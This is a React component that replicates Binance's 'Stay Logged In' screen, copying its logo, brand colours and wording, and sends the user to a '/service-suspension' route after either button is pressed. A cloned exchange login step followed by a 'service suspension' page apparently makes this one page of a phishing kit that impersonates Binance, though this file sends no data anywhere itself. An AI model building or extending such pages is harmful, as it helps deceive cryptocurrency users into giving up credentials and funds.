import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/contexts/AppContext';

export function StayLoggedIn() {
  const navigate = useNavigate();
  const { login } = useApp();
  const [dontShowAgain, setDontShowAgain] = useState(false);

  const handleYes = () => {
    const loginIdentifier = sessionStorage.getItem('loginIdentifier') || 'user@example.com';
    login(loginIdentifier, true);
    navigate('/service-suspension');
  };

  const handleNotNow = () => {
    const loginIdentifier = sessionStorage.getItem('loginIdentifier') || 'user@example.com';
    login(loginIdentifier, false);
    navigate('/service-suspension');
  };

  return (
    <div className="min-h-screen bg-[#1d252b] flex flex-col justify-between p-6 sm:p-8">
      <style>{`
        .custom-checkbox {
          appearance: none;
          width: 16px;
          height: 16px;
          border: 2px solid #6b7280;
          border-radius: 3px;
          background-color: transparent;
          cursor: pointer;
          position: relative;
          transition: all 0.2s;
        }
        .custom-checkbox:checked {
          background-color: #F0B90B;
          border-color: #F0B90B;
        }
        .custom-checkbox:checked::after {
          content: '';
          position: absolute;
          left: 3px;
          top: 0px;
          width: 5px;
          height: 9px;
          border: solid #1a1f2e;
          border-width: 0 2px 2px 0;
          transform: rotate(45deg);
        }
      `}</style>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Logo */}
        <div className="mb-8">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>

        {/* Content */}
        <div className="max-w-md">
          <h1 className="text-white text-2xl font-bold mb-3">Stay Logged In</h1>
          <p className="text-gray-400 text-sm leading-relaxed mb-6">
            By clicking 'Yes', you can stay logged in for up to 5 days on this device. To revoke your logged in status, log out of your Binance account on this device.
          </p>

          {/* Checkbox */}
          <label className="flex items-center gap-2 mb-8 cursor-pointer">
            <input
              type="checkbox"
              className="custom-checkbox"
              checked={dontShowAgain}
              onChange={(e) => setDontShowAgain(e.target.checked)}
            />
            <span className="text-white text-sm">Don't show this message again on this device</span>
          </label>

          {/* Buttons */}
          <div className="space-y-3">
            <button
              onClick={handleYes}
              className="w-full bg-[#FCD535] text-gray-900 font-semibold rounded-lg transition-colors h-12 sm:h-[52px] md:h-12 lg:h-11 px-5 sm:px-6 md:px-8 lg:px-10 text-[15px] sm:text-base md:text-[15px] lg:text-base hover:bg-[#F0B90B]"
            >
              Yes
            </button>
            <button
              onClick={handleNotNow}
              className="w-full bg-[#2B3139] text-white font-semibold rounded-lg transition-colors h-12 sm:h-[52px] md:h-12 lg:h-11 px-5 sm:px-6 md:px-8 lg:px-10 text-[15px] sm:text-base md:text-[15px] lg:text-base hover:bg-[#3a4149]"
            >
              Not Now
            </button>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="flex items-center justify-center gap-8 text-gray-500 text-xs mt-8">
        <button className="flex items-center gap-2 hover:text-gray-400 transition-colors">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10"/>
            <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
          </svg>
          English
        </button>
        <button className="hover:text-gray-400 transition-colors">Cookies</button>
        <button className="hover:text-gray-400 transition-colors">Privacy</button>
      </div>
    </div>
  );
}

export default StayLoggedIn;
